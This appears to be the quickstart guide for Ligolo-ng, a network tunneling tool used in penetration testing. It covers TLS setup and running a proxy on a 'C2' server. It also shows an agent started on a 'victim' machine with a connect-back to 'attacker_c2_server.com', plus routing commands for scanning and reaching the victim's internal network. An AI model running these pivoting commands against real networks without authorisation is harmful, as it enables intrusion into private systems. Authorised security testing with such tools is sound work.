#ligolo-ng

[Ligolo-ng](https://github.com/nicocha30/ligolo-ng/wiki/Quickstart)

## Quickstart

## Prerequisites

### Linux

When using Linux, you need to create a tun interface on the Proxy Server (C2):

```shell
$ sudo ip tuntap add user [your_username] mode tun ligolo
$ sudo ip link set ligolo up
```

> On **Ligolo-ng >= v0.6**, you can now use the `interface_create` command to create a new interface! No need to use ip tuntap!

```
ligolo-ng » interface_create --name "evil-cha"
INFO[3185] Creating a new "evil-cha" interface...       
INFO[3185] Interface created!
```

### Windows

You need to download the [Wintun](https://www.wintun.net/) driver (used by [WireGuard](https://www.wireguard.com/)) and place the `wintun.dll` in the same folder as Ligolo (make sure you use the right architecture).

## TLS Options

#### Using Let's Encrypt Autocert

When using the `-autocert` option, the proxy will automatically request a certificate (using Let's Encrypt) for _attacker\_c2\_server.com_ when an agent connects.

> Port 80 needs to be accessible for Let's Encrypt certificate validation/retrieval

#### Using your own TLS certificates

If you want to use your own certificates for the proxy server, you can use the `-certfile` and `-keyfile` parameters.

#### Automatic self-signed certificates

The _proxy/relay_ can automatically generate self-signed TLS certificates using the `-selfcert` option.

_**Validating self-signed certificates fingerprints (recommended)**_

When running selfcert, you can run the `certificate_fingerprint` command to print the currently used certificate fingerprint.

```
ligolo-ng » certificate_fingerprint 
INFO[0203] TLS Certificate fingerprint for ligolo is: D005527D2683A8F2DB73022FBF23188E064493CFA17D6FCF257E14F4B692E0FC 
```

On the agent, you can then connect using the fingerprint provided by the Ligolo-ng proxy.

```
ligolo-agent -connect 127.0.0.1:11601 -v -accept-fingerprint D005527D2683A8F2DB73022FBF23188E064493CFA17D6FCF257E14F4B692E0FC                                               nchatelain@nworkstation
INFO[0000] Connection established                        addr="127.0.0.1:11601"
```

> By default, the "ligolo" domain name is used for TLS Certificate generation. You can change the domain by using the -selfcert-domain \[domain\] option at startup.

_**Ignoring all certificate verification (for lab/debugging)**_

To ignore all security mechanisms, the `-ignore-cert` option can be used with the _agent_.

> Beware of man-in-the-middle attacks! This option should only be used in a test environment or for debugging purposes.

## Using Ligolo-ng

## Start the Ligolo-ng proxy server

Start the _proxy_ server on your Command and Control (C2) server (default port 11601):

```shell
$ ./proxy -h # Help options
$ ./proxy -autocert # Automatically request LetsEncrypt certificates
$ ./proxy -selfcert # Use self-signed certificates
```

### Start the agent

Start the _agent_ on your target (victim) computer (no privileges are required!):

```shell
$ ./agent -connect attacker_c2_server.com:11601
```

> If you want to tunnel the connection over a SOCKS5 proxy, you can use the `--socks ip:port` option. You can specify SOCKS credentials using the `--socks-user` and `--socks-pass` arguments.

A session should appear on the _proxy_ server.

```
INFO[0102] Agent joined. name=nchatelain@nworkstation remote="XX.XX.XX.XX:38000"
```

Use the `session` command to select the _agent_.

```
ligolo-ng » session 
? Specify a session : 1 - nchatelain@nworkstation - XX.XX.XX.XX:38000
```

### Start the tunneling

Start the tunnel on the proxy, using the `evil-cha` interface name.

```
[Agent : nchatelain@nworkstation] » tunnel_start --tun evil-cha
[Agent : nchatelain@nworkstation] » INFO[0690] Starting tunnel to nchatelain@nworkstation   
```

> On macOS, you need to specify a utun\[0-9\] device, like utun4.

### Setup routing

First, display the network configuration of the agent using the `ifconfig` command:

```
[Agent : nchatelain@nworkstation] » ifconfig 
[...]
┌─────────────────────────────────────────────┐
│ Interface 3                                 │
├──────────────┬──────────────────────────────┤
│ Name         │ wlp3s0                       │
│ Hardware MAC │ de:ad:be:ef:ca:fe            │
│ MTU          │ 1500                         │
│ Flags        │ up|broadcast|multicast       │
│ IPv4 Address │ 192.168.0.30/24             │
└──────────────┴──────────────────────────────┘
```

Then setup routes accordingly.

#### Linux Routing

_Using the terminal:_

```shell
$ sudo ip route add 192.168.0.0/24 dev ligolo
```

_Or using the Ligolo-ng (>= 0.6) cli:_

```
ligolo-ng » interface_add_route --name evil-cha --route 192.168.2.0/24
INFO[3206] Route created.                               
```

#### Windows Routing

```
&gt; netsh int ipv4 show interfaces

Idx     Mét         MTU          État                Nom
---  ----------  ----------  ------------  ---------------------------
 25           5       65535  connected     ligolo
   
&gt; route add 192.168.0.0 mask 255.255.255.0 0.0.0.0 if [THE INTERFACE IDX]
```

## macOS (Darwin) Routing

```
$ sudo ifconfig utun4 alias [random_ip] 255.255.255.0
$ sudo route add -net 192.168.2.0/24 -interface utun4
```

You can now access the _192.168.0.0/24_ _agent_ network from the _proxy_ server.

```shell
$ nmap 192.168.0.0/24 -v -sV -n
[...]
$ rdesktop 192.168.0.123
[...]
```